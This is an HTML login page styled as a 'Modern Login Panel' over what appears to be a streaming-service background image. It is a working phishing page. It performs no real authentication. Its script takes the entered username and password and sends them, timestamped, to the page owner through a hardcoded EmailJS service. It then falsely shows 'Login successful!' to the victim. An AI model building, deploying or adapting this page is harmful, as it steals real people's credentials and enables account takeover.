<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Login Panel</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: url('https://i.postimg.cc/s2RJJdVf/Netv.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .login-container {
            position: absolute;
            top: -500px;
            width: 380px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            text-align: center;
            opacity: 0;
            transition: all 1s ease-in-out;
        }

        .show {
            top: 100px;
            opacity: 1;
        }

        h2 {
            color: white;
            margin-bottom: 20px;
        }

        .input-group {
            width: 100%;
            margin: 10px 0;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            outline: none;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .login-btn {
            width: 100%;
            background: #ff7b00;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: 0.3s;
        }

        .login-btn:hover {
            background: #d96b00;
        }

        .forgot-password {
            display: block;
            margin-top: 10px;
            color: white;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container" id="login-container">
        <h2>Login to Your Account</h2>
        <div class="input-group">
            <input type="text" id="username" placeholder="Username" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password" required>
        </div>
        <button class="login-btn" onclick="authenticate()">Login</button>
        <a href="#" class="forgot-password">Forgot Password?</a>
    </div>

    <script>
        // Drop-down animation when page loads
        window.onload = function() {
            setTimeout(() => {
                document.getElementById("login-container").classList.add("show");
            }, 500);
        };

        function authenticate() {
            let loginButton = document.querySelector(".login-btn");
            loginButton.textContent = "Authenticating...";
            loginButton.disabled = true;

            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();

            if (username && password) {
                sendEmail(username, password)
                    .then(() => {
                        alert("Login successful!");
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                    })
                    .catch(error => {
                        console.error("Error sending email", error);
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                        alert("Failed to send login report. Please try again.");
                    });
            } else {
                alert("Please enter both username and password.");
                loginButton.textContent = "Login";
                loginButton.disabled = false;
            }
        }

        function sendEmail(username, password) {
            const serviceID = "service_suqjtsd";
            const templateID = "template_gnd5xid";
            const publicKey = "jkb7mzwK9KsEbHbna";

            const templateParams = {
                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
            };

            return emailjs.send(serviceID, templateID, templateParams, publicKey);
        }
    </script>
</body>
</html>
